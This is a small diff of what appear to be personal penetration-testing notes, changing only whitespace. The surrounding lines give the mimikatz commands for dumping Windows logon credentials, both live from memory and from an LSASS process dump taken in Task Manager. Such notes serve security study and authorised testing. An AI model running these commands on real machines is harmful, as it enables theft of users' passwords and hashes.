@@ -25,7 +25,7 @@ Use it where possible – Windows only -- very powerfull !!  covers more than se
 /usr/share/windows-resources/mimikatz  //even 1 file .exe will do  
 Open cmd as administartor and execute the mimikatz.exe  
 
-Privilege::debug  //debug mode 
+Privilege::debug  //debug mode  
 sekurlsa::logonpasswords   //dump creds  
 Instead of live dump, can also create a dump of Local Security Authority process from task manager and use it instead  
 sekurlsa::minidump C:\Users\lsass.DMP  
